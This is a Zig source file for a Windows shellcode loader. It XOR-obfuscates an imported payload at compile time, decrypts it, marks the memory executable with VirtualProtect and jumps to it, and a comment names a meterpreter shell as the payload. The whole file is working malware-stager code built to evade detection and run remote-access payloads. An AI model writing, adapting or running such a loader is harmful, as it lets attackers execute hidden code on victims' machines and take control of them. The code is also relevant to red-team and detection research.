const std = @import("std");
const shellcode = @import("shellcode.zig");

// pointer to the data
fn decrypt(data: []u8, key: []const u8) void {
    var data_index: usize = 0;
    var key_index: usize = 0;

    while (data_index < data.len) : ({
        data_index += 1;
        key_index += 1;
    }) {
        if (key_index >= key.len) {
            key_index = 0;
        }
        data[data_index] = data[data_index] ^ key[key_index];
    }
}

// comptime data encryption using xor
fn encrypt(comptime data: []const u8, comptime key: []const u8) [data.len]u8 {
    // set to a large value to prevent compile time error when using large data such as a meterpreter shell or something similar
    @setEvalBranchQuota(200000);
    var encrypted_data: [data.len]u8 = undefined;
    var data_index: usize = 0;
    var key_index: usize = 0;

    while (data_index < data.len) : ({
        data_index += 1;
        key_index += 1;
    }) {
        if (key_index >= key.len) {
            key_index = 0;
        }
        encrypted_data[data_index] = data[data_index] ^ key[key_index];
    }

    return encrypted_data;
}
pub fn main() !void {
    // set key and data to be encrypted at compile time
    const key = "wow";
    const encrypted_data = comptime encrypt(shellcode.buf, key);

    // decrypt data
    var decrypted = encrypted_data;
    decrypt(&decrypted, key);

    const page_size = std.heap.page_size_min;
    const aligned_length = std.mem.alignForward(usize, decrypted.len, page_size);

    // Use the standard alloc method
    const pcode = try std.heap.page_allocator.alloc(u8, aligned_length);
    defer std.heap.page_allocator.free(pcode);

    // Use @memcpy with a slice of the array
    @memcpy(pcode[0..decrypted.len], decrypted[0..]);

    // Set memory protection for windows
    var old_protect: u32 = undefined;
    try std.os.windows.VirtualProtect(pcode.ptr, aligned_length, std.os.windows.PAGE_EXECUTE_READWRITE, &old_protect);

    // call memory that was just allocated
    const ptr: *const fn () void = @ptrCast(pcode.ptr);
    ptr();
}
